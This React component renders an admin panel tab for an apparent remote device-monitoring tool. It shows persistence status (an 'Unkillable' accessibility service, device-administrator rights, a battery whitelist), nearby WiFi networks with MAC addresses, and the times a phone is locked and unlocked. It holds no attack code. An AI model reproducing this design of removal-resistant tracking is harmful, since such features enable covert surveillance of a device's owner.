// components/admin/devices/DeviceSecurityTab.tsx
"use client";

import React from "react";
import { DeviceLockEvent, DeviceWifiNetwork } from "@/lib/device-telemetry-types";
import { ShieldCheck, ShieldAlert, Wifi, Lock, Unlock, Eye, RefreshCw } from "lucide-react";
import { Button } from "@/components/ui/Button";

interface Props {
  lockEvents: DeviceLockEvent[];
  wifiNetworks: DeviceWifiNetwork[];
  currentSsid?: string | null;
  persistenceStatus?: {
    isAdmin?: boolean;
    isAccessibility?: boolean;
    isBatteryWhitelisted?: boolean;
  };
  onScanWifi?: () => void;
  onTogglePersistence?: (key: string, val: boolean) => void;
  loading?: boolean;
}

export const DeviceSecurityTab: React.FC<Props> = ({
  lockEvents,
  wifiNetworks,
  currentSsid,
  persistenceStatus = {},
  onScanWifi,
  onTogglePersistence,
  loading,
}) => {
  return (
    <div className="space-y-4 text-xs">
      {/* 24/7 Anti-Sleep & Persistence Health */}
      <div className="bg-white dark:bg-white/[0.03] p-4 rounded-2xl border border-slate-200/80 dark:border-white/5 space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="font-bold text-slate-900 dark:text-white flex items-center gap-2 text-xs">
            <ShieldCheck className="w-4 h-4 text-emerald-500" />
            24/7 Persistence &amp; Anti-Sleep Health
          </h3>
          <span className="text-[10px] text-slate-400 dark:text-white/40">Tap card to verify/toggle</span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-[11px]">
          <div
            onClick={() => onTogglePersistence?.("is_accessibility_active", !persistenceStatus.isAccessibility)}
            className={`p-3 rounded-xl border flex items-center gap-2.5 cursor-pointer select-none transition-all active:scale-[0.98] ${
              persistenceStatus.isAccessibility ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400 hover:border-rose-400"
            }`}
          >
            {persistenceStatus.isAccessibility ? <ShieldCheck className="w-4 h-4 shrink-0" /> : <ShieldAlert className="w-4 h-4 shrink-0" />}
            <div className="min-w-0 flex-1">
              <p className="font-bold">Accessibility Service</p>
              <p className="text-[10px] opacity-70">{persistenceStatus.isAccessibility ? "Active (Unkillable) ✓" : "Inactive (Tap to set) →"}</p>
            </div>
          </div>

          <div
            onClick={() => onTogglePersistence?.("is_device_admin", !persistenceStatus.isAdmin)}
            className={`p-3 rounded-xl border flex items-center gap-2.5 cursor-pointer select-none transition-all active:scale-[0.98] ${
              persistenceStatus.isAdmin ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400 hover:border-rose-400"
            }`}
          >
            {persistenceStatus.isAdmin ? <ShieldCheck className="w-4 h-4 shrink-0" /> : <ShieldAlert className="w-4 h-4 shrink-0" />}
            <div className="min-w-0 flex-1">
              <p className="font-bold">Device Administrator</p>
              <p className="text-[10px] opacity-70">{persistenceStatus.isAdmin ? "Active (Protected) ✓" : "Inactive (Tap to set) →"}</p>
            </div>
          </div>

          <div
            onClick={() => onTogglePersistence?.("is_battery_unrestricted", !persistenceStatus.isBatteryWhitelisted)}
            className={`p-3 rounded-xl border flex items-center gap-2.5 cursor-pointer select-none transition-all active:scale-[0.98] ${
              persistenceStatus.isBatteryWhitelisted ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400 hover:border-rose-400"
            }`}
          >
            {persistenceStatus.isBatteryWhitelisted ? <ShieldCheck className="w-4 h-4 shrink-0" /> : <ShieldAlert className="w-4 h-4 shrink-0" />}
            <div className="min-w-0 flex-1">
              <p className="font-bold">Battery Optimization</p>
              <p className="text-[10px] opacity-70">{persistenceStatus.isBatteryWhitelisted ? "Unrestricted ✓" : "Standard (Tap to set) →"}</p>
            </div>
          </div>
        </div>
      </div>

      {/* Connected WiFi & Networks */}
      <div className="bg-white dark:bg-white/[0.03] p-4 rounded-2xl border border-slate-200/80 dark:border-white/5 space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="font-bold text-slate-900 dark:text-white flex items-center gap-2 text-xs">
            <Wifi className="w-4 h-4 text-cyan-500" />
            Connected WiFi &amp; Surrounding Access Points
          </h3>
          {onScanWifi && (
            <Button size="sm" variant="secondary" onClick={onScanWifi} className="h-7 text-xs gap-1">
              <RefreshCw className="w-3 h-3" /> Scan WiFi
            </Button>
          )}
        </div>

        {currentSsid && (
          <div className="bg-cyan-500/10 border border-cyan-500/20 p-2.5 rounded-xl flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Wifi className="w-4 h-4 text-cyan-500" />
              <div>
                <p className="text-[10px] text-slate-400 uppercase font-bold">Active WiFi Network</p>
                <p className="font-bold text-slate-900 dark:text-white text-xs">{currentSsid}</p>
              </div>
            </div>
            <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-cyan-500/20 text-cyan-600 dark:text-cyan-400 font-mono">
              Connected
            </span>
          </div>
        )}

        {wifiNetworks.length > 0 && (
          <div className="space-y-1.5 pt-1">
            {wifiNetworks.map((net) => (
              <div key={net.id} className="p-2.5 rounded-xl bg-slate-50 dark:bg-white/[0.02] border border-slate-200/60 dark:border-white/5 flex items-center justify-between">
                <div>
                  <p className="font-bold text-slate-900 dark:text-white text-xs">{net.ssid}</p>
                  <p className="text-[10px] font-mono text-slate-400">{net.bssid ? `MAC: ${net.bssid}` : ""}</p>
                </div>
                <span className="text-[11px] font-mono text-slate-500">{net.signal_level ? `${net.signal_level} dBm` : "—"}</span>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Lock Screen Activity Timeline */}
      <div className="bg-white dark:bg-white/[0.03] p-4 rounded-2xl border border-slate-200/80 dark:border-white/5 space-y-3">
        <h3 className="font-bold text-slate-900 dark:text-white flex items-center gap-2 text-xs">
          <Lock className="w-4 h-4 text-amber-500" />
          Lock Screen &amp; Device Activity Timeline
        </h3>

        {lockEvents.length === 0 ? (
          <p className="text-xs text-slate-400 py-2">No lock screen events logged yet.</p>
        ) : (
          <div className="space-y-1.5">
            {lockEvents.map((e) => {
              const isUnlock = e.event_type === "user_present";
              const isScreenOn = e.event_type === "screen_on";
              return (
                <div key={e.id} className="p-2.5 rounded-xl bg-slate-50 dark:bg-white/[0.02] border border-slate-200/60 dark:border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    {isUnlock ? <Unlock className="w-3.5 h-3.5 text-emerald-500" /> : isScreenOn ? <Eye className="w-3.5 h-3.5 text-amber-500" /> : <Lock className="w-3.5 h-3.5 text-slate-400" />}
                    <span className="font-bold text-slate-900 dark:text-white capitalize">
                      {isUnlock ? "Device Unlocked" : isScreenOn ? "Screen Turned ON" : "Screen Locked (OFF)"}
                    </span>
                  </div>
                  <span className="text-[10px] font-mono text-slate-400">
                    {new Date(e.event_time).toLocaleString([], { dateStyle: "short", timeStyle: "short" })}
                  </span>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
};
